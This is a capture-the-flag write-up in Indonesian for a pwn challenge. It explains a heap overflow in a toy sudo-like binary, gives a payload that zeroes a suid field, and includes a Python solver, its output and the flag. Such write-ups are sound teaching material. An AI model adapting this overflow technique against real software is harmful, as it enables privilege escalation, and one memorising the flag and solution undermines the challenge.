# Kunci Sudo Sing Kesasar — Cara Mendapatkan Flag

[← Overview](78-kunci-sudo-sing-kesasar.md) · [Index](index.md)

> **Langkah 2/5.** Heap overflow: rule buffer dialokasikan dari panjang
> `strcspn`, tetapi `unescape_copy` menyalin panjang penuh. Overflow masuk ke
> struct `{owner, uid, suid}` dan membuat `suid=0`.
>
> **Flag:** `NFX{Wh33W0kTh3Tok-k}`
> **Status:** `VERIFIED` — exploit berhasil direproduksi lokal.

## 1. Binary

Binary **tersedia** di bundle publik:

```text
work/upstream/qazwsx/pwn/KunciSudoSingKesasar.zip
└── peserta/kunci   (ELF 64-bit, non-PIE, not stripped)
```

```bash
unzip -o KunciSudoSingKesasar.zip -d kunci
file kunci/peserta/kunci
readelf -h kunci/peserta/kunci | grep Type
strings -n 5 kunci/peserta/kunci | grep -iE 'flag|sudo|ALL|rule'
```

Temuan:

- `Type: EXEC` (non-PIE), not stripped.
- String: `flag.txt`, `FLAG: %s`, `sudo - penjaga aturan sudoers`,
  `format rule : ALL ALL=(ALL) CMD`, `rule : `.

## 2. Alur `main`

1. `baca_baris(buf, 0x400)` — baca satu baris ke stack.
2. `len_strcspn = strcspn(buf, "\\")` — panjang sampai backslash pertama.
3. `rule = malloc(len_strcspn + 1)` — **alokasi kecil**.
4. `struct = malloc(0x18)` — layout:
   - `owner[16]` di offset `0x00`
   - `uid` di offset `0x10`
   - `suid` di offset `0x14`
5. `snprintf(struct, 0x10, "%s", "user")`, lalu `uid=1000`, `suid=1000`.
6. `unescape_copy(rule, buf, len_baca)` — **panjang penuh**, bukan
   `len_strcspn`.
7. `strncmp(rule, "ALL", 3)` harus lolos.
8. Jika `struct->suid == 0` → `buka_kunci()` membaca `flag.txt`.

## 3. Bug heap

Alokasi memakai `len_strcspn + 1`, tetapi copy memakai `len_baca`. Kalau
input diawali `ALL` lalu ada backslash, `strcspn` sangat kecil, sehingga
`rule` dialokasikan kecil (chunk `0x20`). `unescape_copy` menyalin sisa input
yang jauh lebih panjang ke chunk itu, melewati batas dan masuk ke chunk
`struct` yang dialokasikan tepat setelahnya.

Heap layout yang dipakai:

```text
rule user (0x20 chunk)        struct user (0x20 chunk)
+0x00  A L L ...               +0x20  owner[16]
...                            +0x30  uid
+0x18  chunk berikutnya        +0x34  suid  <-- target 0
```

Jarak `rule user` → `struct user` = `0x20`; `suid` ada di `struct+0x14`,
jadi target null ada di offset **`0x34`** dari `rule user`.

## 4. Payload

```python
payload = b"ALL\\" + b"A" * (0x34 - 3) + b"\x00" * 4 + b"\n"
```

- `ALL` membuat `strncmp` lolos.
- `\` membuat `strcspn` = 3 → `malloc(4)` (chunk `0x20`).
- `A` mengisi sampai offset `0x34`.
- Empat byte `\x00` menimpa `struct->suid` menjadi `0`.
- `uid` ikut menjadi `0x41414141`, tetapi gate hanya mengecek `suid`.

## 5. Solver

Tersimpan di
[`assets/kunci-sudo-sing-kesasar/solve_kunci.py`](assets/kunci-sudo-sing-kesasar/solve_kunci.py):

```python
import subprocess
from pathlib import Path

HERE = Path(__file__).resolve().parent
payload = b"ALL\\" + b"A" * (0x34 - 3) + b"\x00" * 4 + b"\n"
p = subprocess.run([str(HERE / "kunci")], input=payload, capture_output=True)
print(p.stdout.decode(errors="replace"))
```

Jalankan dari folder challenge:

```bash
cd docs/assets/kunci-sudo-sing-kesasar
python3 solve_kunci.py
```

Output nyata:

```text
=== sudo - penjaga aturan sudoers ===
format rule : ALL ALL=(ALL) CMD
rule : [+] sudo: euid=0 - akses root diberikan (owner=AAAAAAAAAAAAAAAAAAAA, uid=1094795585)
FLAG: NFX{Wh33W0kTh3Tok-k}
```

![Exploit lokal — flag tercetak](assets/kunci-sudo-sing-kesasar/10-local-exploit.png)

*Output `solve_kunci.py` dengan binary asli dan `flag.txt` challenge.*

## 6. Catatan remote

Service remote sudah tidak aktif setelah event. Reproduksi di atas memakai
**binary asli dari attachment** dan `flag.txt` yang berisi flag challenge,
jadi jalur heap overflow-nya terbukti. Flag final juga diterima platform
(`CORRECT, BUT ALREADY SOLVED.`).

## Evidence

- [`kunci`](assets/kunci-sudo-sing-kesasar/kunci) — binary asli.
- [`solve_kunci.py`](assets/kunci-sudo-sing-kesasar/solve_kunci.py) — exploit.
- [`10-local-exploit.txt`](assets/kunci-sudo-sing-kesasar/10-local-exploit.txt) — output mentah.
- [`10-local-exploit.png`](assets/kunci-sudo-sing-kesasar/10-local-exploit.png) — terminal evidence.
- [`00b-terminal-evidence.png`](assets/kunci-sudo-sing-kesasar/00b-terminal-evidence.png) — recon binary.
